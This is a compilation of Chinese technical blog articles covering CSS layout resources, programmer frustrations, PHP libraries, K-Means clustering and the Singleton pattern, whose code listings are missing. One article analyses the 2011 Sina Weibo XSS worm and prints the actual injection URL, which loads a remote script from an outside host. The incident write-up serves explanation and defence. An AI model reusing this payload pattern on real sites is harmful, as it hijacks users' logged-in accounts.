3-如何创建一个水平布局的站点– 创建不同于常规的水平布局的站点技术（译者注：水平布局，客户体验也就仁者见仁了）例子查看这里 |下载4-超级简单的两栏布局– 创建不同于常规的水平布局的站点技术（译者注：这里是原作者笔误吧和上面的内容一样）.例子查看这里 下载5-简单两栏CSS布局– 这是一个创建简单两栏布局的教程。这种布局包含了一个标题区，一个水平导航条，主内容区，边侧栏，和页脚区。并且这个布局是水平居中的。例子查看这里6-圣杯布局(The holy grail layout) – 3栏布局会有一些问题 ，这篇文章讨论了一种三栏布局——两栏固定宽度边侧栏加上一栏变宽中栏布局，保证了页面的良好结构和清晰。例子查看这里7-CSS居中101– 如何使用CSS完成居中一个固定宽度的布局使用CSS，通过下面两条规则完成对id为container的DIV所包含的内容居中<body>     <div id="container"> ...entire layout goes here...     </div>     </body>8-从头创建CSS布局– 这个指南通过创建一个全功能的 CSS布局来一步步教你入门CSS布局。
9-非主流！多栏布局– 多栏布局，等高栏（每一列的高度都相等），固定或变宽中央区，简洁标记，CSS 。(译者注：原文作者的图配的和上图一样)例子查看这里10- 创建天下无双的CSS布局– 高灵活性布局,等高栏，跨栏垂直摆放元素。本文告诉你通过何等手段完成这些目标，并使用它们创建天下无双的CSS布局（译者注:原文是One True Layout ，不知道怎么翻译，就天下无双吧。）查看这里11-从PSD到HTML，手把手完成WEB设计-从Photoshop到完整HTML，全过程手把手教会你。例子查看这里 | 下载12- 5个XHTML/CSS技巧 – 5个CSS技巧帮助你完成从基于表格的布局到基于CSS的布局。13-设计一个基于CSS的模板 – 这是一个教你创建基于CSS的模板页的基础教程。这个教程由下面几个部分构成：第一部分覆盖了在Photoshop CS*中的创建导航条按钮，第二部分：创建背景接下来的清单是标题和页面布局，最后的部分在XHTML和CSS中实现。下载14-使用CSS布局跳出常规布局– 如果你理解了基于表格布局的工作方式，你能通过合并或拆分表格创建你随心所欲的布局。就这个目标（同时支持灵活性和可维护性），CSS能够提供比基于表格更多地东西。Jina Bolton的教程解释如何达到这个目标。
15-高级CSS教程:手把手– 这个教程的终极目标创建一个CSS布局，这个CSS布局精确地重组了原有使用table的WebReference.com的布局。16-了解CSS布局的6个关键要素-本文讲述了6件基于CSS布局需要了解的事情：盒模型(Box Model)，浮动栏(Floated Columns) （译者注：float是WEB布局最重要的一个属性了）。使用Em来设置尺寸（Sizing Using Ems），图片替换（Image Replacement）,浮动导航和Sprintes。17-你会犯这些常见的博客布局错误吗？-讨论4个博客布局中常见而且易修复的错误。18-页面布局-CSS页面布局中的浮动元素和定位元素实践指导。你可以查看这些例子：Absolute Position within a relative box two floated boxes和 using a border to provide the background for a column19-Site in an Hour– 使用复杂CCS布局完成简单的工作。#### **关于布局的最佳资源**下面的大多数这些资源不需要许可就能直接使用，然而，其中的一些需要先发邮件确认一下是否可以使用这些资源。因此，在使用之前最好先检查资源的版权信息。
20-简单CSS页面布局– 这里有一套2栏和3栏的CSS布局。你可以通过这里查看这些样例 Liquid three column layout, Left aligned, set width and Liquid insanity.21-完美的三栏变宽布局（百分比定宽度）The Perfect 3 Column Liquid Layout (Percentage widths)– 没有CSS hack（译者注：不知道怎么翻译，点击这里查看解释）. 良好地收索引擎优化.无图. 无Javascript. 跨浏览器 和IPHONE设备兼容你可以通过这里查看样例 Liquid three column layout, Left aligned, set width 和 Liquid insanity. (译者注：这里的链接和上面重复了，哎，原文的错误吧)22-CSS模板和样例你可以通过这里查看这些样例 3 columns fixed centered, fixed Box totallycentered and 3 columns, alldynamic23-IM 布局– IM 布局是一种简单地的CSS布局系统，IM布局提供了全A级的浏览器的支持。
你可以通过这里查看这些样例: The Holy Grail 3 Column Layout, The Classic Blog Layout 和 The Multi Column Layout.24-CSSplay – CSS布局列表你可以通过这里查看这些样例:Cross browser FIXED, Three columns and CSS Frame – The Holy Grill.25-Layoutgala – 基于同样的的标记l得到最大数量的不同的布局方式。没有CCS hack，没有CSS workaround ，良好的浏览器兼容性。40种不同布局。你可以通过这里查看这些样例:Three fixed Columns, Three percentage columns and Liquid, three columns, hybrid widths (吐槽：没有等高，不好看).26-Glish– 许多有用的跨浏览器布局技术你可以通过这里查看这些样例: 3 columns, the holy grail, 2 columns, ALA style and 3 columns, all fluid
27-Thenoodleincident– CSS 从简单的单盒到3盒并增加一个顶部条，所有都是变宽。28-The Layout Reservoir– 很多有用的CSS布局技术你可以通过这里查看这些样例: 2 columns – left menu, 3 columns – flanking menus和 Auto-width Margins .29-The only CSS layout you need– 在这篇文章中将会为你展现10个基于同一的HTML的不同的的布局。你可以通过这里查看这些样例:  Three column CSS layout – left and right menu, Two column CSS layout – top and left menu 和 Three column CSS fluid layout: 100% width30-另一个多栏布局-是一个创建当代流行的变宽的浮动布局的XHTML/CSS框架。这是一个多功能实用的布局。点击这里下载.31-Liquid Designs– 使用XHTML和CSS的变宽设计库。#### **最佳实践**如果你需要寻找一些布局灵感，你可以从下面的网站链接中找到。这些站点演示了CSS布局如何应用于不同类型的网站。查看这些网站是如何分成2栏或3栏，或混合宽栏和窄栏布局。
32-Helldesign33-Silverbackapp34-OS communications informatiques35-Rockatee36-Darrenhoyt37-Makebetterwebsites38-Elitetheme39-Studio7designs40-Brightcreative_(全文完)_# 惹恼程序员的十件事作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!anger程序员应该是一个比较特殊的群体，他们因为长期和电脑打交道所养成的性格和脾气也是比较相近的。当然，既然是人，当然是会有性格的，也是会有脾气的。下面，让我来看看十件能把程序惹毛了的事情。一方面我们可以看看程序员的共性，另一方面我们也可以看看程序员的缺点。无论怎么样，我都希望他们对你的日常工作都是一种帮助。**第十位 程序注释**程序注释本来是一些比较好的习惯，当程序员老手带新手的时候，总是会告诉新手，一定要写程序注释。于是，新手们当然会听从老手的吩咐。只不过，他们可能对程序注释有些误解，于是，我们经常在程序中看到一些如下的注释：r = n/2; //r是n的一半
//循环，仅当r- n/r不大于t   while ((r-n/r) <=t){   … …   r = 0.5 * (r-n/r); // 设置r变量   }每当看到这样的注释——只注释是什么，而不注释为什么，相信你一定会被惹火，这是谁写的程序注释啊？不找来骂一顿看来是不会解气了。程序注释应该是告诉别人你的意图和想法，而不是告诉别人程序的语法，这是为了程序的易读性和可维护性，这样的为了注释而注释的注释，分明不是在注释，而是在挑衅，惹毛别人当然毋庸置疑。**第九位 打断**正当程序沉浸于编程算法的思考，或是灵感突现正在书写程序的时候，但却遭到别人的打断，那是一件非常痛苦的事情，如果被持续打断，那可能会让人一下子就烦躁起来。打断别人的人在这种情况下是非常不礼貌的。被打断的人就像函数调用一下，当其返回时，需要重新恢复断点时的现场，当然，人不是电脑，恢复现场通常是一个很痛苦的过程，极端的情况下可能需要从头开始寻找思绪，然后一点一点地回到断点。因此，我看到一些程序员在需要安静不被打扰的时候，要么会选择去一个没人找得到的地方，要么会在自己的桌子上方高挂一个条幅以示众人——“本人正执行内核程序，无法中断，请勿骚扰，谢谢！”，可能正在沉浸于工作的程序被打断是多么大的开销。自然，被打断所惹毛了的人也不在少数了。
**第八位 需求变化**这个事情估计不用多说了。只要是是程序员，面对需求变化的时候可能总是很无奈的。一次两次可能还要吧接受，但也顶不住经常变啊。据说敏捷开发中有一套方法论可以让程序员们享受需求的变化，不知道是真是假。不过，今天让你做一个书桌，没有让你把书桌改成餐桌，后天让你把餐桌改成双人床，大后天让你把床改成小木屋，然后把小木屋再改成高楼大厦。哎，是人都会被惹毛了的。那些人只用30分钟的会议就可以作出任何决定，但后面那几十个程序员需要搭上几百个小时的辛苦工作。如果是我，可能我也需要神兽草泥马帮助解解气了。不过，这也正说明了，程序员并不懂得怎么和用户沟通，而用户也不懂得和程序员沟通，如果一个项目没有一个中间人（如：PM）在其中协调的话，那么整个项目可能就是“鸡同鸭讲”，用户和程序员都会被对方所惹毛了。如果要例举几个用户被惹毛的事情，估计程序员的那种一根筋的只从技术实现上思考问题的方法应该也能排进前5名。**第七位 经理不懂技术**外行领导内行的事例还少吗？领导一句话，无论对不对，都是对的，我们必需照做，那怕是多么愚蠢多么错误的决定，我们也得照做。程序员其实并不怕经理不懂技术，最怕的就是不懂技术的经理装着很懂技术。最可气的是，当你据理力争的挑站领导权威的时候，领导还把你视为异类。哎，想起这样的领导别说是骂人了，打人的冲动都有了。
其实，经理只不过是一个团队的支持者，他应该帮助团队，为团队排忧解难。而不是对团队发号施令。其实管理真的很简单，如果懂的话，就帮着做，如果不懂的话，就相信下属，放手让下属做。最怕的就是又不懂技术，还不信任下属的经理了。哎，这真是程序员的痛啊。**第六位 用户文档**用户文档本来不应该那么的令人害怕。这些文档记录了一切和我们所开发的软件有关的一些话题。因为我们并不知道我们所面对的用户的电脑操作基础是什么样的，所以，在写下这样的文档的时候，我们必需假设这个用户什么也不懂。于是，需要用最清楚，最漂亮的语言写下一个最丰富的文档。那怕一个拷贝粘贴的操作，可能我们都要分成五、六步来完成，那怕是一个配置IP地址的操作，我们也要从开始菜单开始一步一步的描述。对于程序员来说，他们在开发过程中几乎天天都在使用自己开发的软件，到最后，可能都有得有点吐了，但还得从最简单的部份写这些文档，当然容易令他们烦燥，让程序员来完成这样的文档可能效果会非常不好。所以，对于这样的用户文档，应该由专门的人来完成和维护。**第五位 没有文档**正如上一条所说的，程序员本来就不喜欢写文档，而因为技术人员的表达能力和写作能力一般都不是太好，所以，文档写的也很烂。看看开源社会的文档可能就知道了。但是，我们可爱的程序员另一方面最生气的却是因为没有文档。当然，让面说是的用户的文档，这里我们说的是开发方面的文档，比如设计文档，功能规格，维护文档等等。不过，基本上都是一样的。反正，一方面，我们的程序员不喜欢写文档，另一方面，我们的程序又会被抱怨没有文档，文档太少，或者文档看不懂。呵呵。原来在抱怨方面也有递归啊。据说，敏捷开发可以降低程序开发中的文档，据说他们可以把代码写得跟文档和示图似的，不知道是真是假。不过，我听过太多太多的程序员抱怨没文档太少，文档太差了，这个方面要怪还是怪程序员自己。
**第四位 部署环境**虽然，程序员们开发的是软件，但是我们并不知道我们的程序会被部署或安装在什么样的环境下，比如，网络上的不同，RAID上的不同，BIOS上的不同，操作系统的不同（WinXP和Win2003），有没有杀毒软件，和其它程序是否兼容，系统中有流氓软件或病毒等等。当然，只要你的软件出现错误，无论是你的程序的问题，还是环境的问题，反正都是你的问题，你都得全部解决。所以，程序员们并不是简单地在编程，很多时候，还要当好一个不错系统管理员。每当最后确认问题的原因是环境问题的时候，可能程序员都是会心生怨气。**第三位 问题报告**“我的软件不工作了”，“程序出错了”，每当我们听到这样的问题报告的时候，程序员总是感到很痛苦，因为这样的问题报告等于什么也没有说，但还要程序员去处理这种错误。没有明确的问题描述，没有说明如果重现问题，在感觉上，当然会显得有点被人质问的感觉，甚至，在某些时候还掺杂着看不起，训斥的语气，当然，程序员基本上都是很有个性的，都是软硬不吃的主儿，所以，每当有这样的语气报告问题的时候，他们一般也会把话给顶回去，当然，后面自己然发生一些不愉快的事情。所以，咱们还是需要一个客服部门来帮助我们的程序员和用户做好沟通。
**第二位 程序员自己**惹毛程序员的可能还是程序员自己，程序员是“相轻”的，他们基本上都是持才傲物的，总是觉得自己才是最牛的，在程序员间，他们几乎每天都要吵架，而且一吵就吵得脸红脖子粗。在他们之间，他们总是被自己惹毛。* 技术上的不同见解。比如Linux和Win，VC++和VB，Vi和Emacus，Java和C++，PHP和Ruby等等，等等。什么都要吵。   * 老手对新手的轻视。总是有一些程序员看不起另一些程序员，说话间都带着一种傲慢和训斥。当新手去问问题的时候，老手们总是爱搭不理。   * 在技术上不给对方留面子。不知道为什么，程序员总是不给对方留面子，每当听到有人错误理解某个技术的时候，他们总是喜欢当众大声指证，用别人的“错误”来表明自己的“博学”，并证明他人的“无知”。   * 喜好鄙视。他们喜好鄙视，其实，这个世界上没有一件事是完美的，有好就有不好，要挑毛病太容易了。程序员们特别喜欢鄙视别人，无论是什么的东西，他们总是喜欢看人短而不看人长。经常挂在他们嘴上的口头禅是“太差”、“不行”等等。程序员，长期和电脑打交道，编写出的代码电脑总是认真的运行，长期养成了程序员们目空一切的性格，却不知，这个世界上很多东西并不是能像电脑一样，只要我们输入正确的指令它就正确地运行这么简单。程序员，什么时候才能变成成熟起来……
**第一位 程序员的代码**无论你当时觉得自己的设计和写的代码如何的漂亮和经典，过上一段时间后，再回头看看，你必然会觉得自己的愚蠢。当然，当你需要去维护他人的代码的时候，你一定要在一边维护中一边臭骂别人的代码。是否你还记得当初怎么怎么牛气地和别人讨论自己的设计和自己的代码如何如何完美的？可是，用不了两年，一刚从学校毕业的学生在维护你的代码的过程当中就可以对你的代码指指点点，你的颜面完全扫地。呵呵。当然，也有的人始终觉得自己的设计和代码就是最好的，不过这是用一种比较静止的眼光来看问题。编程这个世界变化总是很快的的，很多事情，只有当我们做过，我们才熟悉他，熟悉了后才知道什么是更好的方法，这是循序渐进的。所以，当你对事情越来越熟悉的时候，再回头看自己以前做的设计和代码的时候，必然会觉得自己的肤浅和愚蠢，当然看别人的设计和代码时，可能也会开始骂人了。（全文完）# 新浪微博的XSS攻击作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn今天晚上（2011年6月28日），新浪微博出现了一次比较大的XSS攻击事件。大量用户自动发送诸如：“郭美美事件的一些未注意到的细节”，“建党大业中穿帮的地方”，“让女人心动的100句诗歌”，“3D肉团团高清普通话版种子”，“这是传说中的神仙眷侣啊”，“惊爆!范冰冰艳照真流出了”等等微博和私信，并自动关注一位名为hellosamy的用户。
事件的经过线索如下：* 20:14，开始有大量带V的认证用户中招转发蠕虫   * 20:30，2kt.cn中的病毒页面无法访问   * 20:32，新浪微博中hellosamy用户无法访问   * 21:02，新浪漏洞修补完毕!新浪微博XSS事件新浪微博XSS事件在这里，想和大家介绍一下XSS攻击，XSS攻击又叫跨站脚本式攻击，你Google一下可以搜到很多很多的文章。我在这里就简单地说一下。首先，我们都知道网上很多网站都可以“记住你的用户名和密码”或是“自动登录”，其实是在你的本地设置了一个cookie，这种方式可以让你免去每次都输入用户名和口令的痛苦，但是也带来很大的问题。试想，如果某用户在“自动登录”的状态下，如果你运行了一个程序，这个程序访问“自动登录”这个网站上一些链接、提交一些表单，那么，也就意味着这些程序不需要输入用户名和口令的手动交互就可以和服务器上的程序通话。这就是XSS攻击的最基本思路。再说一点，不一定是“记住你的用户名和密码”或是“自动登录”的方法，因为HTTP是无状态的协议，所以，几乎所有的网站都会在你的浏览器上设置cookie来记录状态，以便在其多个网页切换中检查你的登录状态。而现在的浏览器的运行方式是多页面或多窗口运行，也就是说，你在同一个父进程下开的多个页面或窗口里都可以无偿和共享使用你登录状态的。
当然，你不必过于担心访问别的网站，在别的网站里的js代码会自动访问你的微博或是网银。因为浏览器的安全性让js只能访问自己所在网站的资源（你可以引入其它网站的js）。当然，这是浏览器对js做的检查，所以，浏览器并不一定会做这个检查，这就是为什么IE6是史上最不安全的浏览器，没有之一。只要你没有在用IE6，应该没有这些问题。XSS攻击有两种方法，* 一种就像SQL Injection或CMD Injection攻击一样，我把一段脚本注入到服务器上，用户访问方法服务器的某个URL，这个URL就会把远端的js注入进来，这个js有可能自动进行很多操作。比如这次事件中的帮你发微博，帮你发站内消息等。注入有很多方法，比如：提交表单，更改URL参数，上传图片，设置签名，等等。* 另一类则是来来自外部的攻击，主要指的自己构造XSS 跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个跨站网页放在自己的服务器上，然后通过结合其它技术，如 社会工程学等，欺骗目标服务器的管理员打开。这一类攻击的威胁相对较低，至少ajax 要发起跨站调用是非常困难的（你可能需要hack浏览器）。
这次新浪微博事件是第一种，其利用了微博广场页面 http://weibo.com/pub/star 的一个URL注入了js脚本，其通过http://163.fm/PxZHoxn短链接服务，将链接指向：http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update注意，上面URL链接中的其实就是<script src=//www.2kt.cn/images/t.js></script>。攻击者并不一定是2kt.cn的人，因为.cn被国家严格管制（大家不知道coolshell.cn 的备案备了不知有多少次），所以，我个人觉得这个人不会愚蠢到用自己域名来做攻击服务器。#### 其它* 初步发现 Chrome 和 Safari 都没中招。IE、Firefox未能幸免。   * 史上最著名的XSS攻击是Yahoo Mail 的Yamanner 蠕虫是一个著名的XSS 攻击实例。早期Yahoo Mail 系统可以执行到信件内的javascript 代码。并且Yahoo Mail 系统使用了Ajax技术，这样病毒javascript 可以的向Yahoo Mail 系统发起ajax 请求，从而得到用户的地址簿，并发送攻击代码给他人。   * 为什么那个用户叫hellosamy，因为samy)是第一个XSS攻击性的蠕虫病毒，在MySpace上传播。   * 关于攻击的代码在这里：06.28_sina_XSS.txt （编码风格还是很不错的）
（全文完）# 20 你应该知道的PHP库作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是一些非常有用的PHP类库，相信一定可以为你的WEB开发提供更好和更为快速的方法。### 图表库!021151lephpant-e_png下面的类库可以让你很简的创建复杂的图表和图片。当然，它们需要GD库的支持。1. pChart – 一个可以创建统计图的库。   2. Libchart – 这也是一个简单的统计图库。   3. JpGraph – 一个面向对象的图片创建类。   4. Open Flash Chart – 这是一个基于Flash的统计图。### RSS 解析解释RSS并是一件很单调的事情，不过幸好你有下面的类库可以帮助你方便地读取RSS的Feed。1. MagpieRSS – 开源的PHP版RSS解析器，据说功能强大，未验证。   2. SimplePie – 这是一个非常快速，而且易用的RSS和Atom 解析库。### 缩略图生成1. phpThumb – 功能很强大，如何强大还是自己去体会吧。### 支付你的网站需要处理支付方面的事情？需要一个和支付网关的程序？下面这个程序可以帮到你。
1. PHP Payment Library – 支持Paypal, Authorize.net 和2Checkout (2CO)### OpenID1. PHP-OpenID – 支持OpenID的一个PHP库。OpenID是帮助你使用相同的用户名和口令登录不同的网站的一种解决方案。如果你对OpenID不熟悉的话，你可以到这里看看：### 数据为抽象/对象关系映射ORM1. ADOdb – 数据库抽象   2. Doctrine – 对象关系映射Object relational mapper (ORM) ，需要 PHP 5.2.3+ 版本，一个非常强大的database abstraction layer (DBAL).   3. Propel – 对象关系映射框架- PHP5   4. Outlet – 也是关于对象关系映射的一个工具。注：对象关系映射（Object Relational Mapping，简称ORM）是一种为了解决面向对象与关系数据库存在的互不匹配的现象的技术。 简单的说，ORM是通过使用描述对象和数据库之间映射的元数据，将程序中的对象自动持久化到关系数据库中。本质上就是将数据从一种形式转换到另外一种形式。 这也同时暗示者额外的执行开销；然而，如果ORM作为一种中间件实现，则会有很多机会做优化，而这些在手写的持久层并不存在。 更重要的是用于控制转换的元数据需要提供和管理；但是同样，这些花费要比维护手写的方案要少；而且就算是遵守ODMG规范的对象数据库依然需要类级别的元数据。
### PDF 生成器1. FPDF – 这量一个可以让你生成PDF的纯PHP类库。### Excel 相关你的站点需要生成Excel？没有问题，下面这两个类库可以让你轻松做到这一点。1. php-excel – 这是一个非常简单的Excel文件生成类。   2. PHP Excel Reader – 可以解析并读取XLS文件中的数据。### E-Mail 相关不喜欢PHP的mail函数？觉得不够强大？下面的PHP邮件相关的库绝对不会让你失望。1. Swift Mailer – 免费的超多功能的PHP邮件库。   2. PHPMailer – 超强大的邮件发送类。### 单元测试如果你在使用测试驱动的方法开发你的程序，下面的类库和框架绝你能帮助你的开发。1. SimpleTest – 一个PHP的单元测试和网页测试的框架。   2. PHPUnit – 来自xUnit 家族，提供一个框架可以让你方便地进行单元测试的案例开发。并可非常容易地分析其测试结果。文章：来源# K-Means 算法作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn最近在学习一些数据挖掘的算法，看到了这个算法，也许这个算法对你来说很简单，但对我来说，我是一个初学者，我在网上翻看了很多资料，发现中文社区没有把这个问题讲得很全面很清楚的文章，所以，把我的学习笔记记录下来，分享给大家。
在数据挖掘中， **_k_ -Means 算法**是一种 cluster analysis 的算法，其主要是来计算数据聚集的算法，主要通过不断地取离种子点最近均值的算法。目录* 问题   * 算法概要   * 求点群中心的算法   * K-Means的演示   * K-Means ++ 算法   * K-Means 算法应用#### 问题K-Means算法主要解决的问题如下图所示。我们可以看到，在图的左边有一些点，我们用肉眼可以看出来有四个点群，但是我们怎么通过计算机程序找出这几个点群来呢？于是就出现了我们的K- Means算法（Wikipedia链接）K-Means 要解决的问题#### 算法概要这个算法其实很简单，如下图所示：!K-Means 算法概要K-Means 算法概要从上图中，我们可以看到， **A, B, C, D, E 是五个在图中点。而灰色的点是我们的种子点，也就是我们用来找点群的点** 。有两个种子点，所以K=2。然后，K-Means的算法如下：1. 随机在图中取K（这里K=2）个种子点。   2. 然后对图中的所有点求到这K个种子点的距离，假如点Pi离种子点Si最近，那么Pi属于Si点群。（上图中，我们可以看到A,B属于上面的种子点，C,D,E属于下面中部的种子点）   3. 接下来，我们要移动种子点到属于他的“点群”的中心。（见图上的第三步）   4. 然后重复第2）和第3）步，直到，种子点没有移动（我们可以看到图中的第四步上面的种子点聚合了A,B,C，下面的种子点聚合了D，E）。
这个算法很简单，但是有些细节我要提一下，求距离的公式我不说了，大家有初中毕业水平的人都应该知道怎么算的。我重点想说一下“求点群中心的算法”#### 求点群中心的算法一般来说，求点群中心点的算法你可以很简的使用各个点的X/Y坐标的平均值。不过，我这里想告诉大家另三个求中心点的的公式：**1）Minkowski Distance 公式 ——** λ 可以随意取值，可以是负数，也可以是正数，或是无穷大。**2）Euclidean Distance 公式** —— 也就是第一个公式 λ=2 的情况**3）CityBlock Distance 公式** —— 也就是第一个公式 λ=1 的情况这三个公式的求中心点有一些不一样的地方，我们看下图（对于第一个 λ 在 0-1之间）。**（1）Minkowski Distance （2） **Euclidean Distance （3） **CityBlock Distance******上面这几个图的大意是他们是怎么个逼近中心的，第一个图以星形的方式，第二个图以同心圆的方式，第三个图以菱形的方式。#### K-Means的演示如果你以”K Means Demo“为关键字到Google里查你可以查到很多演示。这里推荐一个演示
操作是，鼠标左键是初始化点，右键初始化“种子点”，然后勾选“Show History”可以看到一步一步的迭代。注：这个演示的链接也有一个不错的 K Means Tutorial 。#### K-Means ++ 算法K-Means主要有两个最重大的缺陷——都和初始值有关：* K 是事先给定的，这个 K 值的选定是非常难以估计的。很多时候，事先并不知道给定的数据集应该分成多少个类别才最合适。（ ISODATA 算法通过类的自动合并和分裂，得到较为合理的类型数目 K）* K-Means算法需要用初始随机种子点来搞，这个随机种子点太重要，不同的随机种子点会有得到完全不同的结果。（K-Means++算法可以用来解决这个问题，其可以有效地选择初始点）我在这里重点说一下 K-Means++算法步骤：1. 先从我们的数据库随机挑个随机点当“种子点”。   2. 对于每个点，我们都计算其和最近的一个“种子点”的距离D(x)并保存在一个数组里，然后把这些距离加起来得到Sum(D(x))。   3. 然后，再取一个随机值，用权重的方式来取计算下一个“种子点”。这个算法的实现是，先取一个能落在Sum(D(x))中的随机值Random，然后用Random -= D(x)，直到其<=0，此时的点就是下一个“种子点”。   4. 重复第（2）和第（3）步直到所有的K个种子点都被选出来。   5. 进行K-Means算法。
相关的代码你可以在这里找到“implement the K-means++ algorithm”(墙) 另，Apache 的通用数据学库也实现了这一算法#### K-Means 算法应用看到这里，你会说，K-Means算法看来很简单，而且好像就是在玩坐标点，没什么真实用处。而且，这个算法缺陷很多，还不如人工呢。是的，前面的例子只是玩二维坐标点，的确没什么意思。但是你想一下下面的几个问题：1）如果不是二维的，是多维的，如5维的，那么，就只能用计算机来计算了。2）二维坐标点的X, Y 坐标，其实是一种向量，是一种数学抽象。现实世界中很多属性是可以抽象成向量的，比如，我们的年龄，我们的喜好，我们的商品，等等，能抽象成向量的目的就是可以让计算机知道某两个属性间的距离。如：我们认为，18岁的人离24岁的人的距离要比离12岁的距离要近，鞋子这个商品离衣服这个商品的距离要比电脑要近，等等。**只要能把现实世界的物体的属性抽象成向量，就可以用K-Means算法来归类了** 。在 《k均值聚类(K-means)》 这篇文章中举了一个很不错的应用例子，作者用亚洲15支足球队的2005年到1010年的战绩做了一个向量表，然后用K- Means把球队归类，得出了下面的结果，呵呵。
* 亚洲一流：日本，韩国，伊朗，沙特   * 亚洲二流：乌兹别克斯坦，巴林，朝鲜   * 亚洲三流：中国，伊拉克，卡塔尔，阿联酋，泰国，越南，阿曼，印尼其实，这样的业务例子还有很多，比如，分析一个公司的客户分类，这样可以对不同的客户使用不同的商业策略，或是电子商务中分析商品相似度，归类商品，从而可以使用一些不同的销售策略，等等。最后给一个挺好的算法的幻灯片：（全文完）# 深入浅出单实例Singleton设计模式作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn单实例Singleton设计模式可能是被讨论和使用的最广泛的一个设计模式了，这可能也是面试中问得最多的一个设计模式了。这个设计模式主要目的是想在整个系统中只能出现一个类的实例。这样做当然是有必然的，比如你的软件的全局配置信息，或者是一个Factory，或是一个主控类，等等。你希望这个类在整个系统中只能出现一个实例。当然，作为一个技术负责人的你，你当然有权利通过使用非技术的手段来达到你的目的。比如：你在团队内部明文规定，“XX类只能有一个全局实例，如果某人使用两次以上，那么该人将被处于2000元的罚款！”（呵呵），你当然有权这么做。但是如果你的设计的是东西是一个类库，或是一个需要提供给用户使用的API，恐怕你的这项规定将会失效。因为，你无权要求别人会那么做。所以，这就是为什么，我们希望通过使用技术的手段来达成这样一个目的的原因。
本文会带着你深入整个Singleton的世界，当然，我会放弃使用C++语言而改用Java语言，因为使用Java这个语言可能更容易让我说明一些事情。####   **Singleton的教学版本**这里，我将直接给出一个Singleton的简单实现，因为我相信你已经有这方面的一些基础了。我们姑且把这个版本叫做1.0版在上面的实例中，我想说明下面几个Singleton的特点：（下面这些东西可能是尽人皆知的，没有什么新鲜的）1. 私有（private）的构造函数，表明这个类是不可能形成实例了。这主要是怕这个类会有多个实例。   2. 即然这个类是不可能形成实例，那么，我们需要一个静态的方式让其形成实例：getInstance()。注意这个方法是在new自己，因为其可以访问私有的构造函数，所以他是可以保证实例被创建出来的。   3. 在getInstance()中，先做判断是否已形成实例，如果已形成则直接返回，否则创建实例。   4. 所形成的实例保存在自己类中的私有成员中。   5. 我们取实例时，只需要使用Singleton.getInstance()就行了。当然，如果你觉得知道了上面这些事情后就学成了，那得给你当头棒喝一下了，事情远远没有那么简单。
#### **Singleton的实际版本**上面的这个程序存在比较严重的问题，因为是全局性的实例，所以，在多线程情况下，所有的全局共享的东西都会变得非常的危险，这个也一样，在多线程情况下，如果多个线程同时调用getInstance()的话，那么，可能会有多个进程同时通过 (singleton== null)的条件检查，于是，多个实例就创建出来，并且很可能造成内存泄露问题。嗯，熟悉多线程的你一定会说——“我们需要线程互斥或同步”，没错，我们需要这个事情，于是我们的Singleton升级成1.1版，如下所示：嗯，使用了Java的synchronized方法，看起来不错哦。应该没有问题了吧？！错！这还是有问题！为什么呢？前面已经说过，如果有多个线程同时通过(singleton== null)的条件检查（因为他们并行运行），虽然我们的synchronized方法会帮助我们同步所有的线程，让我们并行线程变成串行的一个一个去new，那不还是一样的吗？同样会出现很多实例。嗯，确实如此！看来，还得把那个判断(singleton== null)条件也同步起来。于是，我们的Singleton再次升级成1.2版本，如下所示：
不错不错，看似很不错了。在多线程下应该没有什么问题了，不是吗？的确是这样的，1.2版的Singleton在多线程下的确没有问题了，因为我们同步了所有的线程。只不过嘛……，什么？！还不行？！是的，还是有点小问题，我们本来只是想让new这个操作并行就可以了，现在，只要是进入getInstance()的线程都得同步啊，注意，创建对象的动作只有一次，后面的动作全是读取那个成员变量，这些读取的动作不需要线程同步啊。这样的作法感觉非常极端啊，为了一个初始化的创建动作，居然让我们达上了所有的读操作，严重影响后续的性能啊！还得改！嗯，看来，在线程同步前还得加一个(singleton== null)的条件判断，如果对象已经创建了，那么就不需要线程的同步了。OK，下面是1.3版的Singleton。感觉代码开始变得有点罗嗦和复杂了，不过，这可能是最不错的一个版本了，这个版本又叫“双重检查”Double-Check。下面是说明：1. 第一个条件是说，如果实例创建了，那就不需要同步了，直接返回就好了。   2. 不然，我们就开始同步线程。   3. 第二个条件是说，如果被同步的线程中，有一个线程创建了对象，那么别的线程就不用再创建了。
相当不错啊，干得非常漂亮！请大家为我们的1.3版起立鼓掌！但是，如果你认为这个版本大攻告成，你就错了。主要在于 **singleton`= new Singleton()`**这句，这并非是一个原子操作，事实上在 JVM 中这句话大概做了下面 3 件事情。1. 给 singleton 分配内存   2. 调用 Singleton 的构造函数来初始化成员变量，形成实例   3. 将singleton对象指向分配的内存空间（执行完这步 singleton才是非 null 了）但是在 JVM 的即时编译器中存在指令重排序的优化。也就是说上面的第二步和第三步的顺序是不能保证的，最终的执行顺序可能是 1-2-3 也可能是 1-3-2。如果是后者，则在 3 执行完毕、2 未执行之前，被线程二抢占了，这时 instance 已经是非 null 了（但却没有初始化），所以线程二会直接返回 instance，然后使用，然后顺理成章地报错。对此，我们只需要把singleton声明成 volatile 就可以了。下面是1.4版：使用 volatile 有两个功用：1）这个变量不会在多个线程中存在复本，直接从内存读取。
